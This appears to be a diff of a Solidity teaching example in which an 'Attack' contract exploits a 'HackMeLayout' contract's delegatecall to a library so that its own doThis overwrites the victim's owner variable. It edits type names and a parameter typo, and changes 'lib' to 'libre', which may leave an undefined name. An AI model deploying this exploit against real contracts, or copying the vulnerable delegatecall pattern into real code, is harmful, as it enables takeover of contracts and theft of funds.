@@ -20,7 +20,7 @@ contract HackMeLayout {
     }
     
     function doThis(uint _num) public {
-        lib.delegatecall(abi.encodeWithSignature("doThis(uint256)", _num));
+        libre.delegatecall(abi.encodeWithSignature("doThis(uint256)", _num));
     }
 }
 
@@ -31,10 +31,10 @@ contract Attack {
     address public owner;
     uint public aNum;
     
-    HackMe public hackMe;
+    HackMeLayout public hackMe;
     
-    constructor(HackMe _hackMe) {
-        hackMe = HackMe(_hackMe);
+    constructor(HackMeLayout _hackMe) {
+        hackMe = HackMeLayout(_hackMe);
     }
     
     function attack() public {
@@ -43,7 +43,7 @@ contract Attack {
         hackMe.doThis(1); 
     }
     
-    function doThis(uint_num) public {
+    function doThis(uint _num) public {
         owner = msg.sender;
     }
 }
